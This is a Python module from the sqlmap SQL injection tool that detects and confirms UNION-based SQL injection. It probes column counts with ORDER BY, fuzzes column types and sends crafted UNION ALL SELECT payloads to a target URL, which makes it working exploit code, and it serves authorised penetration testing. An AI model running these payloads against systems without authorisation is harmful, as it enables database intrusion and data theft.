#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import itertools
import logging
import random
import re

from lib.core.agent import agent
from lib.core.common import average
from lib.core.common import Backend
from lib.core.common import getPublicTypeMembers
from lib.core.common import isNullValue
from lib.core.common import listToStrValue
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import removeReflectiveValues
from lib.core.common import setTechnique
from lib.core.common import singleTimeLogMessage
from lib.core.common import singleTimeWarnMessage
from lib.core.common import stdev
from lib.core.common import wasLastResponseDBMSError
from lib.core.compat import xrange
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.decorators import stackedmethod
from lib.core.dicts import FROM_DUMMY_TABLE
from lib.core.enums import FUZZ_UNION_COLUMN
from lib.core.enums import PAYLOAD
from lib.core.settings import FUZZ_UNION_ERROR_REGEX
from lib.core.settings import FUZZ_UNION_MAX_COLUMNS
from lib.core.settings import LIMITED_ROWS_TEST_NUMBER
from lib.core.settings import MAX_RATIO
from lib.core.settings import MIN_RATIO
from lib.core.settings import MIN_STATISTICAL_RANGE
from lib.core.settings import MIN_UNION_RESPONSES
from lib.core.settings import NULL
from lib.core.settings import ORDER_BY_MAX
from lib.core.settings import ORDER_BY_STEP
from lib.core.settings import UNION_MIN_RESPONSE_CHARS
from lib.core.settings import UNION_STDEV_COEFF
from lib.core.unescaper import unescaper
from lib.request.comparison import comparison
from lib.request.connect import Connect as Request

def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=PAYLOAD.WHERE.ORIGINAL):
    """
    Finds number of columns affected by UNION based injection
    """
    retVal = None

    @stackedmethod
    def _orderByTechnique(lowerCount=None, upperCount=None):
        def _orderByTest(cols):
            query = agent.prefixQuery("ORDER BY %d" % cols, prefix=prefix)
            query = agent.suffixQuery(query, suffix=suffix, comment=comment)
            payload = agent.payload(newValue=query, place=place, parameter=parameter, where=where)
            page, headers, code = Request.queryPage(payload, place=place, content=True, raise404=False)
            return not any(re.search(_, page or "", re.I) and not re.search(_, kb.pageTemplate or "", re.I) for _ in ("(warning|error):", "order (by|clause)", "unknown column", "failed")) and not kb.heavilyDynamic and comparison(page, headers, code) or re.search(r"data types cannot be compared or sorted", page or "", re.I) is not None

        if _orderByTest(1 if lowerCount is None else lowerCount) and not _orderByTest(randomInt() if upperCount is None else upperCount + 1):
            infoMsg = "'ORDER BY' technique appears to be usable. "
            infoMsg += "This should reduce the time needed "
            infoMsg += "to find the right number "
            infoMsg += "of query columns. Automatically extending the "
            infoMsg += "range for current UNION query injection technique test"
            singleTimeLogMessage(infoMsg)

            lowCols, highCols = 1 if lowerCount is None else lowerCount, ORDER_BY_STEP if upperCount is None else upperCount
            found = None
            while not found:
                if not conf.uCols and _orderByTest(highCols):
                    lowCols = highCols
                    highCols += ORDER_BY_STEP

                    if highCols > ORDER_BY_MAX:
                        break
                else:
                    while not found:
                        mid = highCols - (highCols - lowCols) // 2
                        if _orderByTest(mid):
                            lowCols = mid
                        else:
                            highCols = mid
                        if (highCols - lowCols) < 2:
                            found = lowCols

            return found

    try:
        pushValue(kb.errorIsNone)
        items, ratios = [], []
        kb.errorIsNone = False
        lowerCount, upperCount = conf.uColsStart, conf.uColsStop

        if kb.orderByColumns is None and (lowerCount == 1 or conf.uCols):  # Note: ORDER BY is not bullet-proof
            found = _orderByTechnique(lowerCount, upperCount) if conf.uCols else _orderByTechnique()

            if found:
                kb.orderByColumns = found
                infoMsg = "target URL appears to have %d column%s in query" % (found, 's' if found > 1 else "")
                singleTimeLogMessage(infoMsg)
                return found
            elif kb.futileUnion:
                return None

        if abs(upperCount - lowerCount) < MIN_UNION_RESPONSES:
            upperCount = lowerCount + MIN_UNION_RESPONSES

        min_, max_ = MAX_RATIO, MIN_RATIO
        pages = {}

        for count in xrange(lowerCount, upperCount + 1):
            query = agent.forgeUnionQuery('', -1, count, comment, prefix, suffix, kb.uChar, where)
            payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)
            page, headers, code = Request.queryPage(payload, place=place, content=True, raise404=False)

            if not isNullValue(kb.uChar):
                pages[count] = page

            ratio = comparison(page, headers, code, getRatioValue=True) or MIN_RATIO
            ratios.append(ratio)
            min_, max_ = min(min_, ratio), max(max_, ratio)
            items.append((count, ratio))

        if not isNullValue(kb.uChar):
            for regex in (kb.uChar.strip("'"), r'>\s*%s\s*<' % kb.uChar.strip("'")):
                contains = [count for count, content in pages.items() if re.search(regex, content or "", re.IGNORECASE) is not None]
                if len(contains) == 1:
                    retVal = contains[0]
                    break

        if not retVal:
            if min_ in ratios:
                ratios.pop(ratios.index(min_))
            if max_ in ratios:
                ratios.pop(ratios.index(max_))

            minItem, maxItem = None, None

            for item in items:
                if item[1] == min_:
                    minItem = item
                elif item[1] == max_:
                    maxItem = item

            if all(_ == min_ and _ != max_ for _ in ratios):
                retVal = maxItem[0]

            elif all(_ != min_ and _ == max_ for _ in ratios):
                retVal = minItem[0]

            elif abs(max_ - min_) >= MIN_STATISTICAL_RANGE:
                deviation = stdev(ratios)

                if deviation is not None:
                    lower, upper = average(ratios) - UNION_STDEV_COEFF * deviation, average(ratios) + UNION_STDEV_COEFF * deviation

                    if min_ < lower:
                        retVal = minItem[0]

                    if max_ > upper:
                        if retVal is None or abs(max_ - upper) > abs(min_ - lower):
                            retVal = maxItem[0]
    finally:
        kb.errorIsNone = popValue()

    if retVal:
        infoMsg = "target URL appears to be UNION injectable with %d columns" % retVal
        singleTimeLogMessage(infoMsg, logging.INFO, re.sub(r"\d+", 'N', infoMsg))

    return retVal

def _fuzzUnionCols(place, parameter, prefix, suffix):
    retVal = None

    if Backend.getIdentifiedDbms() and not re.search(FUZZ_UNION_ERROR_REGEX, kb.pageTemplate or "") and kb.orderByColumns:
        comment = queries[Backend.getIdentifiedDbms()].comment.query

        choices = getPublicTypeMembers(FUZZ_UNION_COLUMN, True)
        random.shuffle(choices)

        for candidate in itertools.product(choices, repeat=kb.orderByColumns):
            if retVal:
                break
            elif FUZZ_UNION_COLUMN.STRING not in candidate:
                continue
            else:
                candidate = [_.replace(FUZZ_UNION_COLUMN.INTEGER, str(randomInt())).replace(FUZZ_UNION_COLUMN.STRING, "'%s'" % randomStr(20)) for _ in candidate]

            query = agent.prefixQuery("UNION ALL SELECT %s%s" % (','.join(candidate), FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms(), "")), prefix=prefix)
            query = agent.suffixQuery(query, suffix=suffix, comment=comment)
            payload = agent.payload(newValue=query, place=place, parameter=parameter, where=PAYLOAD.WHERE.NEGATIVE)
            page, headers, code = Request.queryPage(payload, place=place, content=True, raise404=False)

            if not re.search(FUZZ_UNION_ERROR_REGEX, page or ""):
                for column in candidate:
                    if column.startswith("'") and column.strip("'") in (page or ""):
                        retVal = [(_ if _ != column else "%s") for _ in candidate]
                        break

    return retVal

def _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.ORIGINAL):
    validPayload = None
    vector = None

    positions = [_ for _ in xrange(0, count)]

    # Unbiased approach for searching appropriate usable column
    random.shuffle(positions)

    for charCount in (UNION_MIN_RESPONSE_CHARS << 2, UNION_MIN_RESPONSE_CHARS):
        if vector:
            break

        # For each column of the table (# of NULL) perform a request using
        # the UNION ALL SELECT statement to test it the target URL is
        # affected by an exploitable union SQL injection vulnerability
        for position in positions:
            # Prepare expression with delimiters
            randQuery = randomStr(charCount)
            phrase = ("%s%s%s" % (kb.chars.start, randQuery, kb.chars.stop)).lower()
            randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
            randQueryUnescaped = unescaper.escape(randQueryProcessed)

            # Forge the union SQL injection request
            query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where)
            payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)

            # Perform the request
            page, headers, _ = Request.queryPage(payload, place=place, content=True, raise404=False)
            content = ("%s%s" % (removeReflectiveValues(page, payload) or "", removeReflectiveValues(listToStrValue(headers.headers if headers else None), payload, True) or "")).lower()

            if content and phrase in content:
                validPayload = payload
                kb.unionDuplicates = len(re.findall(phrase, content, re.I)) > 1
                vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, conf.forcePartial, kb.tableFrom, kb.unionTemplate)

                if where == PAYLOAD.WHERE.ORIGINAL:
                    # Prepare expression with delimiters
                    randQuery2 = randomStr(charCount)
                    phrase2 = ("%s%s%s" % (kb.chars.start, randQuery2, kb.chars.stop)).lower()
                    randQueryProcessed2 = agent.concatQuery("\'%s\'" % randQuery2)
                    randQueryUnescaped2 = unescaper.escape(randQueryProcessed2)

                    # Confirm that it is a full union SQL injection
                    query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, multipleUnions=randQueryUnescaped2)
                    payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)

                    # Perform the request
                    page, headers, _ = Request.queryPage(payload, place=place, content=True, raise404=False)
                    content = ("%s%s" % (page or "", listToStrValue(headers.headers if headers else None) or "")).lower()

                    if not all(_ in content for _ in (phrase, phrase2)):
                        vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, True, kb.tableFrom, kb.unionTemplate)
                    elif not kb.unionDuplicates:
                        fromTable = " FROM (%s) AS %s" % (" UNION ".join("SELECT %d%s%s" % (_, FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms(), ""), " AS %s" % randomStr() if _ == 0 else "") for _ in xrange(LIMITED_ROWS_TEST_NUMBER)), randomStr())

                        # Check for limited row output
                        query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, fromTable=fromTable)
                        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)

                        # Perform the request
                        page, headers, _ = Request.queryPage(payload, place=place, content=True, raise404=False)
                        content = ("%s%s" % (removeReflectiveValues(page, payload) or "", removeReflectiveValues(listToStrValue(headers.headers if headers else None), payload, True) or "")).lower()
                        if content.count(phrase) > 0 and content.count(phrase) < LIMITED_ROWS_TEST_NUMBER:
                            warnMsg = "output with limited number of rows detected. Switching to partial mode"
                            logger.warn(warnMsg)
                            vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, True, kb.tableFrom, kb.unionTemplate)

                unionErrorCase = kb.errorIsNone and wasLastResponseDBMSError()

                if unionErrorCase and count > 1:
                    warnMsg = "combined UNION/error-based SQL injection case found on "
                    warnMsg += "column %d. sqlmap will try to find another " % (position + 1)
                    warnMsg += "column with better characteristics"
                    logger.warn(warnMsg)
                else:
                    break

    return validPayload, vector

def _unionConfirm(comment, place, parameter, prefix, suffix, count):
    validPayload = None
    vector = None

    # Confirm the union SQL injection and get the exact column
    # position which can be used to extract data
    validPayload, vector = _unionPosition(comment, place, parameter, prefix, suffix, count)

    # Assure that the above function found the exploitable full union
    # SQL injection position
    if not validPayload:
        validPayload, vector = _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.NEGATIVE)

    return validPayload, vector

def _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix):
    """
    This method tests if the target URL is affected by an union
    SQL injection vulnerability. The test is done up to 50 columns
    on the target database table
    """

    validPayload = None
    vector = None
    orderBy = kb.orderByColumns
    uChars = (conf.uChar, kb.uChar)
    where = PAYLOAD.WHERE.ORIGINAL if isNullValue(kb.uChar) else PAYLOAD.WHERE.NEGATIVE

    # In case that user explicitly stated number of columns affected
    if conf.uColsStop == conf.uColsStart:
        count = conf.uColsStart
    else:
        count = _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where)

    if count:
        validPayload, vector = _unionConfirm(comment, place, parameter, prefix, suffix, count)

        if not all((validPayload, vector)) and not all((conf.uChar, conf.dbms, kb.unionTemplate)):
            if Backend.getIdentifiedDbms() and kb.orderByColumns and kb.orderByColumns < FUZZ_UNION_MAX_COLUMNS:
                if kb.fuzzUnionTest is None:
                    msg = "do you want to (re)try to find proper "
                    msg += "UNION column types with fuzzy test? [y/N] "

                    kb.fuzzUnionTest = readInput(msg, default='N', boolean=True)
                    if kb.fuzzUnionTest:
                        kb.unionTemplate = _fuzzUnionCols(place, parameter, prefix, suffix)

            warnMsg = "if UNION based SQL injection is not detected, "
            warnMsg += "please consider "

            if not conf.uChar and count > 1 and kb.uChar == NULL:
                message = "injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] "

                if not readInput(message, default='Y', boolean=True):
                    warnMsg += "usage of option '--union-char' "
                    warnMsg += "(e.g. '--union-char=1') "
                else:
                    conf.uChar = kb.uChar = str(randomInt(2))
                    validPayload, vector = _unionConfirm(comment, place, parameter, prefix, suffix, count)

            if not conf.dbms:
                if not conf.uChar:
                    warnMsg += "and/or try to force the "
                else:
                    warnMsg += "forcing the "
                warnMsg += "back-end DBMS (e.g. '--dbms=mysql') "

            if not all((validPayload, vector)) and not warnMsg.endswith("consider "):
                singleTimeWarnMessage(warnMsg)

        if orderBy is None and kb.orderByColumns is not None and not all((validPayload, vector)):  # discard ORDER BY results (not usable - e.g. maybe invalid altogether)
            conf.uChar, kb.uChar = uChars
            validPayload, vector = _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)

    return validPayload, vector

@stackedmethod
def unionTest(comment, place, parameter, value, prefix, suffix):
    """
    This method tests if the target URL is affected by an union
    SQL injection vulnerability. The test is done up to 3*50 times
    """

    if conf.direct:
        return

    negativeLogic = kb.negativeLogic
    setTechnique(PAYLOAD.TECHNIQUE.UNION)

    try:
        if negativeLogic:
            pushValue(kb.negativeLogic)
            pushValue(conf.string)
            pushValue(conf.code)

            kb.negativeLogic = False
            conf.string = conf.code = None

        validPayload, vector = _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)
    finally:
        if negativeLogic:
            conf.code = popValue()
            conf.string = popValue()
            kb.negativeLogic = popValue()

    if validPayload:
        validPayload = agent.removePayloadDelimiters(validPayload)

    return validPayload, vector
